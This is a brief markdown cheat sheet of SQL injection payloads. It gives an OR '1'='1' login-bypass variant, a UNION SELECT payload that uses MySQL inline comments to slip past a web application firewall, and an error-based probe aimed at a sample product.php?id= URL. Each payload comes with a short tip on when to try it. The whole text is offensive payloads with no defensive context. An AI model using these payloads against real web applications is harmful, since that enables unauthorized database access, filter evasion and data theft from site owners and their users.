# check 

- > if ``OR '1'='1'--`` not work try : 
  > 
  > ```
  > ' OR '1'='1' /*
  > ```
  >
  > if A WAF blocks typical SQL keywords ``(SELECT, UNION, OR)``.
  >
  > ```
  > 1' /*!UNION*/ SELECT 1,2--
  > ```
  >
  > most effective for error-based SQLi here ``https://example.com/product.php?id=5``
  >
  > ```
  > 5' AND (SELECT 1/0)--
  > ```
